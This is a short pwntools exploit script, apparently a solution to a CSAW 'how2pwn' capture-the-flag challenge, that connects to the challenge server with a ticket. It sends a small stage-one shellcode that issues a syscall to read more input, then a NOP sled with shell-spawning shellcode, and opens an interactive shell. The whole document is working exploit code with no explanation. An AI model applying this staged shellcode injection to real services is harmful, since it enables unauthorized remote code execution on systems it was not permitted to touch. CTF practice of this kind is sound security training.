from pwn import *
# p = process("./chal2")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
debug = 0
if debug:
    p = process("./chal2")
else:
    p = remote("how2pwn.chal.csaw.io",60002)
    # p = remote("0.0.0.0",60002)
    with open("./ticket2",'r') as f:
        ticket = f.read().strip()
    p.send(ticket)
    
context.arch = 'amd64'
shellcode = f'''
mov rdx,0x100
syscall
'''
shellcode = asm(shellcode)
p.sendafter(": \n",shellcode.ljust(0x10,b'\0'))
p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))
p.interactive()
